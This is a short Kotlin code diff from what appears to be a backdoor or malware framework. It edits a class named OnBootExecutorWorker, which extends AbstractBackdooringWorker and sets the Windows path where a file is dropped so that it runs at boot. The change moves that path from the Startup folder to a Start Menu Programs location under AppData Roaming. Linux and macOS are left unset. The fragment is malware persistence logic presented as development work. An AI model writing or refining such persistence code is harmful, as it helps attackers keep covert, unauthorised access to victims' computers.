@@ -20,7 +20,7 @@ abstract class OnBootExecutorWorker(
 ) : AbstractBackdooringWorker(httpClient, entkerner) {
     override val name = "OnBootExecutionWorker"
     override val file = object : SystemFileURI() {
-        override val windows = appData  / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / publicName
+        override val windows = appData / "Roaming"  / "Microsoft" / "Windows" / "Start Menu" / "Programs" / publicName
         override val linux = nullPath
         override val darwin = nullPath
     }
